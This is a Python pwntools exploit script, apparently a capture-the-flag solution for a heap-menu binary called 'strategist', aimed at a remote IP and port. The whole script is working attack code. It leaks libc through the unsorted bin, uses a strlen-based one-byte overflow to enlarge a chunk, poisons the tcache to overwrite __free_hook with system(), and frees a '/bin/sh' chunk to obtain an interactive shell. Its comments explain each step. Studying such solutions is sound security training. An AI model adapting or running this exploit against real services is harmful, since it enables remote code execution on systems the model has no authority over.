#!/usr/bin/env python3

from pwn import *

exe = ELF("./strategist_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.63.197", 51891)

    return r


def create_plan(size: int, payload: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.sendafter(b"> ", payload)


def show_plan(index: int) -> bytes:
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b">", str(index).encode("ascii"))
    r.recvuntil(f"Plan [{index}]: ".encode())
    return r.recvline().strip()


def edit_plan(index: int, payload: bytes):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(index).encode("ascii"))
    r.sendafter(b"> ", payload)


def delete_plan(index: int):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b">", str(index).encode("ascii"))


def main():
    r = conn()

    create_plan(0x808, b"A" * 0x808)    # Allocate a big chunk
    create_plan(0x38, b"B" * 0x38)      # This will help us also to avoid consolidation and for the next part
    create_plan(0x18, b"C" * 0x18)

    delete_plan(0)
    create_plan(0x808, b"A")    # This will overwrite just one byte of unsortedbin address
    libc.address = int.from_bytes(show_plan(0).ljust(8, b"\x00"), "little") - (libc.sym.main_arena + 1)
    log.info(f"libc @ 0x{libc.address:x}")

    # Tcache poisoning into a hook overwrite to `system()`
    # First we have to "re-create" the big chunk
    delete_plan(0)
    create_plan(0x808, b"A" * 0x808)

    # Then we need a freed chunk that will be overlapped by another chunk afterward
    delete_plan(2)

    # Now we can poison the tcache: we overwrite the size of a tcache chunk with the vulnerability!
    # The program uses `strlen()` to retrieve the plan length but it will also count the bytes used
    # for the metadata if we fill completely the chunk
    edit_plan(0, b"A" * 0x808 + b"\x71")

    # Now we have the (now) bigger chunk overlapping the smaller freed chunk!
    # We can now overwrite the "next" pointer to `__free_hook` and write `system()` address into it
    delete_plan(1)
    create_plan(0x68, b"B" * 0x38 + p64(0x21) + p64(libc.sym.__free_hook))
    create_plan(0x18, b"Z")     # Dummy chunk used to move the tcache list to the target address
    create_plan(0x18, p64(libc.sym.system))

    # Now we have to create a plan with string "/bin/sh" and free it
    create_plan(0x58, b"/bin/sh")
    delete_plan(4)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
